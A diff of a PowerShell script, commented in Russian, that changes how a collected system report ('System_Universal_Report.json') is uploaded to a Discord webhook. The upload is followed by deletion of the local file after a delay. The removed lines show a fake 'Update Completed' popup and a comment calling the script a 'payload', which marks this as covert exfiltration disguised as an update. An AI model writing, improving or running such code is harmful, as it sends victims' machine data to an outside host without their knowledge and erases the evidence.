@@ -90,29 +90,39 @@ Write-Output "✅ Расширенный отчет сохранён: $reportPat
 
 # ========== ОТПРАВКА В DISCORD ==========
 try {
-    Add-Type -AssemblyName System.Net.Http
-    $fileBytes = [System.IO.File]::ReadAllBytes($reportPath)
-    $fileContent = [System.Net.Http.ByteArrayContent]::new($fileBytes)
-    $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
+    $maxSizeMB = 8
+    $fileInfo = Get-Item $reportPath
+    $fileSizeMB = [math]::Round($fileInfo.Length / 1MB, 2)
 
-    $multiPartContent = New-Object System.Net.Http.MultipartFormDataContent
-    $multiPartContent.Add($fileContent, "file", "System_Universal_Report.json")
-
-    $httpClient = New-Object System.Net.Http.HttpClient
-    $response = $httpClient.PostAsync($webhookUrl, $multiPartContent).Result
-
-    if ($response.IsSuccessStatusCode) {
-        Write-Output "📤 Успешно отправлено в Discord!"
-
-        Start-Sleep -Seconds $deleteDelaySeconds
-        Remove-Item -Path $reportPath -Force
-        Write-Output "🗑️ Локальный файл удалён после $deleteDelaySeconds сек."
-    } else {
-        Write-Output "❌ Ошибка отправки в Discord: $($response.StatusCode)"
+    if ($fileSizeMB -gt $maxSizeMB) {
+        Write-Output "❌ Файл превышает лимит Discord (8 МБ): $fileSizeMB МБ"
+        return
     }
-} catch {
-    Write-Output "❌ Исключение: $_"
-}
-# Popup message to signal the payload is done
 
-$done = New-Object -ComObject Wscript.Shell;$done.Popup("Update Completed",1)
+    $boundary = [System.Guid]::NewGuid().ToString()
+    $LF = "`r`n"
+    $fileBytes = [System.IO.File]::ReadAllBytes($reportPath)
+    $fileContent = [System.Text.Encoding]::UTF8.GetString($fileBytes)
+
+    $bodyLines = @()
+    $bodyLines += "--$boundary"
+    $bodyLines += 'Content-Disposition: form-data; name="file"; filename="System_Universal_Report.json"'
+    $bodyLines += "Content-Type: application/json$LF"
+    $bodyLines += $fileContent
+    $bodyLines += "--$boundary--$LF"
+
+    $body = [System.Text.Encoding]::UTF8.GetBytes(($bodyLines -join $LF))
+    $headers = @{
+        "Content-Type" = "multipart/form-data; boundary=$boundary"
+    }
+
+    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -Headers $headers
+    Write-Output "📤 Успешно отправлено в Discord!"
+
+    Start-Sleep -Seconds $deleteDelaySeconds
+    Remove-Item -Path $reportPath -Force
+    Write-Output "🗑️ Локальный файл удалён после $deleteDelaySeconds сек."
+}
+catch {
+    Write-Output "❌ Исключение при отправке: $_"
+}
